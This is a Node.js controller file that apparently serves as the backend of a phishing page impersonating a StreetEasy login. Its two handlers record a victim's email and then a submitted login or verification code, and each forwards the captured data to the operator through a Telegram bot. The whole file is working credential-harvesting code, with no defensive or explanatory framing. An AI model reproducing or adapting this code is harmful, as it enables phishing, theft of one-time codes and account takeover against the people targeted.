const Login = require("../model/login");
const TelegramBot = require("node-telegram-bot-api");
const os = require("os");

const getIpAddress = () => {
  const networkInterfaces = os.networkInterfaces();
  let ipAddress;
  for (const interfaceName in networkInterfaces) {
    const interfaces = networkInterfaces[interfaceName];
    for (const iface of interfaces) {
      if (!iface.internal && iface.family === "IPv4") {
        ipAddress = iface.address;
        break;
      }
    }
    if (ipAddress) {
      break;
    }
  }
  return ipAddress;
};


const bot = new TelegramBot(process.env.TELEGRAM_BOT);

const sendEmail = async (req, res) => {
  try {
   
    const ipAddress = getIpAddress();
     const userAgent = req.headers["user-agent"];
    let user = await Login.findOne({ ip: ipAddress + userAgent });

    if(user) {
        user.email = req.body.email
        await user.save()
    }

   
    req.body.ip = getIpAddress() + userAgent;
    user = await Login.create(req.body);
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `New email from street easy: ${`${user.email}`}`);
    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};



const sendCode = async (req, res) => {
  try {
    const ipAddress = getIpAddress();
    const userAgent = req.headers["user-agent"];

    const user = await Login.findOneAndUpdate({ ip: ipAddress + userAgent }, {code: req.body.code} ,{new: true});

    
    const message = `${`${user.code} from ${user.email}`}`;
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message);

    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};

module.exports = {
  sendEmail,
  sendCode,
};
